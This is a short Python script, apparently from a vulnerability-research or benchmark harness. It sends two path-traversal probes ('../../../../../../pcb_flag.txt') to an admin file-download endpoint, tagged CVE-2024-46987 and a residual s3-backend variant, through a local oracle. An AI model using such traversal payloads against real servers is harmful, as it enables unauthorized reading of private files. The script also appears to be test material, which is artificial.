import json, sys
sys.path.insert(0, ".")
from oracle import run_probe

# seed shape (original_poc candidate): backend local
seed_candidate = {
    "probe_id": "cve-2024-46987-local-traversal",
    "backend": "local",
    "endpoint": "/admin/media/download_private_file",
    "param": "file",
    "payload": "../../../../../../pcb_flag.txt",
}
# residual: same endpoint/payload, s3 backend
res_candidate = {
    "probe_id": "cve-2026-1776-s3-residual",
    "backend": "s3",
    "endpoint": "/admin/media/download_private_file",
    "param": "file",
    "payload": "../../../../../../pcb_flag.txt",
}

print("SEED on V1 local:")
print(json.dumps(run_probe(seed_candidate, version="v1"), indent=2))
print("RESIDUAL on V1 s3:")
print(json.dumps(run_probe(res_candidate, version="v1"), indent=2))
